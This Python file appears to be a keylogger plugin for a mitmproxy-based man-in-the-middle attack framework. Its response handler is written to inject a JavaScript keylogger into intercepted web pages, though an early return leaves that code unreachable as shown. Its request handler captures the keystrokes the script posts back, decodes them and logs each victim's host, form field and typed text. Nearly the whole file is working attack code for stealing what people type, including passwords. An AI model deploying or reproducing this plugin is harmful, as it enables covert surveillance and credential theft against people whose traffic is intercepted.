from mitmproxy.models import decoded
from plugins.plugin import PluginTemplate

# Copyright (C) 2015-2016 xtr4nge [_AT_] gmail.com, Marcello Salvati (@byt3bl33d3r)
#
# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program.  If not, see <http://www.gnu.org/licenses/>.
#

class keylogger(PluginTemplate):
    name    = 'keylogger'
    version = '1.0'
    desc    = ' it stores all keystrokes along with a timestamps in a n array and send it to the attacker '
    content     = './core/scripts/msfkeylogger.js'
    inject_content = ""
    with open(content, 'r') as f:
        for line in f:
            inject_content += line

    def request(self, flow):
        if flow.request.method == 'POST' and ('keylog' in flow.request.path):

            raw_keys = flow.request.content.split("&&")[0]
            input_field = flow.request.content.split("&&")[1]

            keys = raw_keys.split(",")
            if keys:
                del keys[0]; del(keys[len(keys)-1])

                nice = ''
                for n in keys:
                    if n == '9':
                        nice += "<TAB>"
                    elif n == '8':
                        nice = nice[:-1]
                    elif n == '13':
                        nice = ''
                    else:
                        try:
                            nice += n.decode('hex')
                        except:
                            self.log.info("["+self.name+"] Error decoding char: {}".format(n))

                self.log.info("["+self.name+"] Host: {} | Field: {} | Keys: {}".format(flow.request.host, input_field, nice))

    def response(self, flow):
        return
        with decoded(flow.response):
            
            flow.response.content = flow.response.content.replace("</body>", "<script>" + self.inject_content + "</script></body>")
            self.log.info('[{}] *********** keylogger injected *****************'.format(self.name))
            